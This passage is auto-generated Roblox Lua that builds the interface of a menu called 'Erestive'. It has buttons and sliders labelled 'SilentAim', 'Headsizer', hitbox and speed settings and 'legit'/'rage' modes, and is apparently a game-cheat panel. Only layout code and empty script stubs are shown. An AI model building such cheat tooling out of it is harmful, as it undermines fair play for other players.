G2L["322"]["Rotation"] = -90;
G2L["322"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.FOVSet2
G2L["323"] = Instance.new("TextBox", G2L["317"]);
G2L["323"]["Visible"] = false;
G2L["323"]["Name"] = [[FOVSet2]];
G2L["323"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["323"]["TextWrapped"] = true;
G2L["323"]["TextSize"] = 14;
G2L["323"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["323"]["TextScaled"] = true;
G2L["323"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["323"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["323"]["ClearTextOnFocus"] = false;
G2L["323"]["PlaceholderText"] = [[Speed]];
G2L["323"]["Size"] = UDim2.new(0, 33, 0, 33);
G2L["323"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["323"]["Text"] = [[0.1]];
G2L["323"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.UIListLayout
G2L["324"] = Instance.new("UIListLayout", G2L["317"]);
G2L["324"]["Padding"] = UDim.new(0, 10);
G2L["324"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.TextButton
G2L["325"] = Instance.new("TextButton", G2L["317"]);
G2L["325"]["TextWrapped"] = true;
G2L["325"]["BorderSizePixel"] = 0;
G2L["325"]["TextSize"] = 14;
G2L["325"]["TextScaled"] = true;
G2L["325"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["325"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["325"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["325"]["BackgroundTransparency"] = 1;
G2L["325"]["Size"] = UDim2.new(0.87, 0, 1, 0);
G2L["325"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["325"]["Text"] = [[1]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.TextButton.legit
G2L["326"] = Instance.new("LocalScript", G2L["325"]);
G2L["326"]["Name"] = [[legit]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.TextButton.rage
G2L["327"] = Instance.new("LocalScript", G2L["325"]);
G2L["327"]["Enabled"] = false;
G2L["327"]["Name"] = [[rage]];
G2L["327"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.UIGradient
G2L["328"] = Instance.new("UIGradient", G2L["315"]);
G2L["328"]["Rotation"] = -90;
G2L["328"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.ImageLabel
G2L["329"] = Instance.new("ImageLabel", G2L["315"]);
G2L["329"]["BorderSizePixel"] = 0;
G2L["329"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["329"]["Image"] = [[rbxassetid://136632536925811]];
G2L["329"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["329"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["329"]["BackgroundTransparency"] = 1;
G2L["329"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.WhiteBar
G2L["32a"] = Instance.new("Frame", G2L["315"]);
G2L["32a"]["Visible"] = false;
G2L["32a"]["BorderSizePixel"] = 0;
G2L["32a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["32a"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["32a"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["32a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["32a"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.WhiteBar.UIGradient
G2L["32b"] = Instance.new("UIGradient", G2L["32a"]);
G2L["32b"]["Rotation"] = 90;
G2L["32b"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.UIStroke
G2L["32c"] = Instance.new("UIStroke", G2L["315"]);
G2L["32c"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.TextLabel
G2L["32d"] = Instance.new("TextLabel", G2L["312"]);
G2L["32d"]["TextWrapped"] = true;
G2L["32d"]["BorderSizePixel"] = 0;
G2L["32d"]["TextSize"] = 14;
G2L["32d"]["TextScaled"] = true;
G2L["32d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["32d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["32d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32d"]["Size"] = UDim2.new(0, 142, 0, 50);
G2L["32d"]["Visible"] = false;
G2L["32d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32d"]["Text"] = [[Hithox head change value]];
G2L["32d"]["Position"] = UDim2.new(-0.01379, 0, 1.15, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.TextLabel.UICorner
G2L["32e"] = Instance.new("UICorner", G2L["32d"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed
G2L["32f"] = Instance.new("Frame", G2L["2ec"]);
G2L["32f"]["BorderSizePixel"] = 0;
G2L["32f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["32f"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["32f"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["32f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32f"]["Name"] = [[Speed]];
G2L["32f"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.UIListLayout
G2L["330"] = Instance.new("UIListLayout", G2L["32f"]);
G2L["330"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV
G2L["331"] = Instance.new("Frame", G2L["32f"]);
G2L["331"]["BorderSizePixel"] = 0;
G2L["331"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["331"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["331"]["Name"] = [[FOV]];
G2L["331"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.UICorner
G2L["332"] = Instance.new("UICorner", G2L["331"]);
G2L["332"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig
G2L["333"] = Instance.new("Frame", G2L["331"]);
G2L["333"]["BorderSizePixel"] = 0;
G2L["333"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["333"]["Size"] = UDim2.new(0.57695, 0, 0.81331, 0);
G2L["333"]["Position"] = UDim2.new(0.39591, 0, 0.09064, 0);
G2L["333"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.UICorner
G2L["334"] = Instance.new("UICorner", G2L["333"]);
G2L["334"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.FOVSet
G2L["335"] = Instance.new("TextBox", G2L["333"]);
G2L["335"]["Visible"] = false;
G2L["335"]["Name"] = [[FOVSet]];
G2L["335"]["PlaceholderColor3"] = Color3.fromRGB(90, 169, 157);
G2L["335"]["TextWrapped"] = true;
G2L["335"]["TextSize"] = 14;
G2L["335"]["TextColor3"] = Color3.fromRGB(71, 255, 38);
G2L["335"]["TextScaled"] = true;
G2L["335"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["335"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["335"]["ClearTextOnFocus"] = false;
G2L["335"]["PlaceholderText"] = [[Dis]];
G2L["335"]["Size"] = UDim2.new(0, 33, 0, 33);
G2L["335"]["Position"] = UDim2.new(0.54158, 0, 0, 0);
G2L["335"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["335"]["Text"] = [[100]];
G2L["335"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.FOVSet.LocalScript
G2L["336"] = Instance.new("LocalScript", G2L["335"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV
G2L["337"] = Instance.new("Frame", G2L["333"]);
G2L["337"]["Visible"] = false;
G2L["337"]["ZIndex"] = 2;
G2L["337"]["BorderSizePixel"] = 0;
G2L["337"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["337"]["Size"] = UDim2.new(1.68032, 0, 0.36356, 0);
G2L["337"]["Position"] = UDim2.new(-0.76654, 0, 1.31329, 0);
G2L["337"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["337"]["Name"] = [[SetFOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.Animations
G2L["338"] = Instance.new("LocalScript", G2L["337"]);
G2L["338"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.Animations.Sample
G2L["339"] = Instance.new("ImageLabel", G2L["338"]);
G2L["339"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["339"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["339"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["339"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["339"]["BackgroundTransparency"] = 1;
G2L["339"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.UICorner
G2L["33a"] = Instance.new("UICorner", G2L["337"]);
G2L["33a"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.Button
G2L["33b"] = Instance.new("TextButton", G2L["337"]);
G2L["33b"]["TextWrapped"] = true;
G2L["33b"]["TextSize"] = 14;
G2L["33b"]["TextScaled"] = true;
G2L["33b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["33b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["33b"]["BackgroundTransparency"] = 1;
G2L["33b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["33b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["33b"]["Text"] = [[ ]];
G2L["33b"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.Button.Animations
G2L["33c"] = Instance.new("LocalScript", G2L["33b"]);
G2L["33c"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.Button.Loca2
G2L["33d"] = Instance.new("LocalScript", G2L["33b"]);
G2L["33d"]["Enabled"] = false;
G2L["33d"]["Name"] = [[Loca2]];
G2L["33d"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.Button.Loca3
G2L["33e"] = Instance.new("LocalScript", G2L["33b"]);
G2L["33e"]["Name"] = [[Loca3]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.Button.Loca1
G2L["33f"] = Instance.new("LocalScript", G2L["33b"]);
G2L["33f"]["Enabled"] = false;
G2L["33f"]["Name"] = [[Loca1]];
G2L["33f"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.Button.Loca4
G2L["340"] = Instance.new("LocalScript", G2L["33b"]);
G2L["340"]["Enabled"] = false;
G2L["340"]["Name"] = [[Loca4]];
G2L["340"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.Button.Loca5
G2L["341"] = Instance.new("LocalScript", G2L["33b"]);
G2L["341"]["Enabled"] = false;
G2L["341"]["Name"] = [[Loca5]];
G2L["341"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.Button.Loca6
G2L["342"] = Instance.new("LocalScript", G2L["33b"]);
G2L["342"]["Enabled"] = false;
G2L["342"]["Name"] = [[Loca6]];
G2L["342"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.Button.Loca7
G2L["343"] = Instance.new("LocalScript", G2L["33b"]);
G2L["343"]["Enabled"] = false;
G2L["343"]["Name"] = [[Loca7]];
G2L["343"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.Button.Loca8
G2L["344"] = Instance.new("LocalScript", G2L["33b"]);
G2L["344"]["Enabled"] = false;
G2L["344"]["Name"] = [[Loca8]];
G2L["344"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.Text
G2L["345"] = Instance.new("TextLabel", G2L["337"]);
G2L["345"]["TextWrapped"] = true;
G2L["345"]["ZIndex"] = 9;
G2L["345"]["TextSize"] = 14;
G2L["345"]["TextScaled"] = true;
G2L["345"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["345"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["345"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["345"]["BackgroundTransparency"] = 1;
G2L["345"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["345"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["345"]["Text"] = [[Set Speed]];
G2L["345"]["Name"] = [[Text]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.UIGradient
G2L["346"] = Instance.new("UIGradient", G2L["337"]);
G2L["346"]["Rotation"] = -90;
G2L["346"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.FOVSet2
G2L["347"] = Instance.new("TextBox", G2L["333"]);
G2L["347"]["Visible"] = false;
G2L["347"]["Name"] = [[FOVSet2]];
G2L["347"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["347"]["TextWrapped"] = true;
G2L["347"]["TextSize"] = 14;
G2L["347"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["347"]["TextScaled"] = true;
G2L["347"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["347"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["347"]["ClearTextOnFocus"] = false;
G2L["347"]["PlaceholderText"] = [[Speed]];
G2L["347"]["Size"] = UDim2.new(0, 33, 0, 33);
G2L["347"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["347"]["Text"] = [[0.1]];
G2L["347"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.UIListLayout
G2L["348"] = Instance.new("UIListLayout", G2L["333"]);
G2L["348"]["Padding"] = UDim.new(0, 10);
G2L["348"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.TextButton
G2L["349"] = Instance.new("TextButton", G2L["333"]);
G2L["349"]["TextWrapped"] = true;
G2L["349"]["BorderSizePixel"] = 0;
G2L["349"]["TextSize"] = 14;
G2L["349"]["TextScaled"] = true;
G2L["349"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["349"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["349"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["349"]["BackgroundTransparency"] = 1;
G2L["349"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["349"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["349"]["Text"] = [[SilentAim]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.TextButton.LocalScript
G2L["34a"] = Instance.new("LocalScript", G2L["349"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.UIGradient
G2L["34b"] = Instance.new("UIGradient", G2L["331"]);
G2L["34b"]["Rotation"] = -90;
G2L["34b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.ImageLabel
G2L["34c"] = Instance.new("ImageLabel", G2L["331"]);
G2L["34c"]["BorderSizePixel"] = 0;
G2L["34c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["34c"]["Image"] = [[rbxassetid://87867532553953]];
G2L["34c"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["34c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["34c"]["BackgroundTransparency"] = 1;
G2L["34c"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.WhiteBar
G2L["34d"] = Instance.new("Frame", G2L["331"]);
G2L["34d"]["Visible"] = false;
G2L["34d"]["BorderSizePixel"] = 0;
G2L["34d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34d"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["34d"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["34d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["34d"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.WhiteBar.UIGradient
G2L["34e"] = Instance.new("UIGradient", G2L["34d"]);
G2L["34e"]["Rotation"] = 90;
G2L["34e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.UIStroke
G2L["34f"] = Instance.new("UIStroke", G2L["331"]);
G2L["34f"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.UIGradient
G2L["350"] = Instance.new("UIGradient", G2L["331"]);
G2L["350"]["Rotation"] = -90;
G2L["350"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Headsizer
G2L["351"] = Instance.new("Frame", G2L["2ec"]);
G2L["351"]["BorderSizePixel"] = 0;
G2L["351"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["351"]["Size"] = UDim2.new(0.96172, 0, 0.07267, 0);
G2L["351"]["Position"] = UDim2.new(-0, 0, 0.23306, 0);
G2L["351"]["Name"] = [[Headsizer]];
G2L["351"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Headsizer.WhiteBar
G2L["352"] = Instance.new("Frame", G2L["351"]);
G2L["352"]["BorderSizePixel"] = 0;
G2L["352"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["352"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["352"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["352"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["352"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Headsizer.WhiteBar.UIGradient
G2L["353"] = Instance.new("UIGradient", G2L["352"]);
G2L["353"]["Rotation"] = 90;
G2L["353"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Headsizer.Slider
G2L["354"] = Instance.new("Frame", G2L["351"]);
G2L["354"]["BorderSizePixel"] = 0;
G2L["354"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["354"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["354"]["Position"] = UDim2.new(0.80655, 0, 0.11724, 0);
G2L["354"]["Name"] = [[Slider]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Headsizer.Slider.Animations
G2L["355"] = Instance.new("LocalScript", G2L["354"]);
G2L["355"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Headsizer.Slider.Animations.Sample
G2L["356"] = Instance.new("ImageLabel", G2L["355"]);
G2L["356"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["356"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["356"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["356"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["356"]["BackgroundTransparency"] = 1;
G2L["356"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Headsizer.Slider.UICorner
G2L["357"] = Instance.new("UICorner", G2L["354"]);
G2L["357"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Headsizer.Slider.UIGradient
G2L["358"] = Instance.new("UIGradient", G2L["354"]);
G2L["358"]["Rotation"] = -90;
G2L["358"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Headsizer.Slider.Button
G2L["359"] = Instance.new("TextButton", G2L["354"]);
G2L["359"]["TextSize"] = 14;
G2L["359"]["TextColor3"] = Color3.fromRGB(55, 0, 0);
G2L["359"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["359"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["359"]["ZIndex"] = 2;
G2L["359"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["359"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["359"]["Text"] = [[ ]];
G2L["359"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Headsizer.Slider.Button.LocalScript
G2L["35a"] = Instance.new("LocalScript", G2L["359"]);
G2L["35a"]["Enabled"] = false;
G2L["35a"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Headsizer.Slider.Button.UICorner
G2L["35b"] = Instance.new("UICorner", G2L["359"]);
G2L["35b"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Headsizer.OnOrOff
G2L["35c"] = Instance.new("TextLabel", G2L["351"]);
G2L["35c"]["TextWrapped"] = true;
G2L["35c"]["ZIndex"] = 2;
G2L["35c"]["TextSize"] = 14;
G2L["35c"]["TextScaled"] = true;
G2L["35c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["35c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["35c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["35c"]["BackgroundTransparency"] = 1;
G2L["35c"]["Size"] = UDim2.new(0.39881, 0, 0.5158, 0);
G2L["35c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["35c"]["Text"] = [[Legit]];
G2L["35c"]["Name"] = [[OnOrOff]];
G2L["35c"]["Position"] = UDim2.new(0.40774, 0, 0.2225, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Headsizer.UICorner
G2L["35d"] = Instance.new("UICorner", G2L["351"]);
G2L["35d"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Headsizer.UIGradient
G2L["35e"] = Instance.new("UIGradient", G2L["351"]);
G2L["35e"]["Rotation"] = -90;
G2L["35e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Headsizer.ImageLabel
G2L["35f"] = Instance.new("ImageLabel", G2L["351"]);
G2L["35f"]["BorderSizePixel"] = 0;
G2L["35f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["35f"]["Image"] = [[rbxassetid://136632536925811]];
G2L["35f"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["35f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35f"]["BackgroundTransparency"] = 1;
G2L["35f"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Headsizer.UIStroke
G2L["360"] = Instance.new("UIStroke", G2L["351"]);
G2L["360"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap
G2L["361"] = Instance.new("Frame", G2L["2ec"]);
G2L["361"]["BorderSizePixel"] = 0;
G2L["361"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["361"]["Size"] = UDim2.new(0.96172, 0, 0.07267, 0);
G2L["361"]["Position"] = UDim2.new(-0, 0, 0.23306, 0);
G2L["361"]["Name"] = [[DoubleTap]];
G2L["361"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap.WhiteBar
G2L["362"] = Instance.new("Frame", G2L["361"]);
G2L["362"]["BorderSizePixel"] = 0;
G2L["362"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["362"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["362"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["362"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["362"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap.WhiteBar.UIGradient
G2L["363"] = Instance.new("UIGradient", G2L["362"]);
G2L["363"]["Rotation"] = 90;
G2L["363"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap.Slider
G2L["364"] = Instance.new("Frame", G2L["361"]);
G2L["364"]["BorderSizePixel"] = 0;
G2L["364"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["364"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["364"]["Position"] = UDim2.new(0.80655, 0, 0.11724, 0);
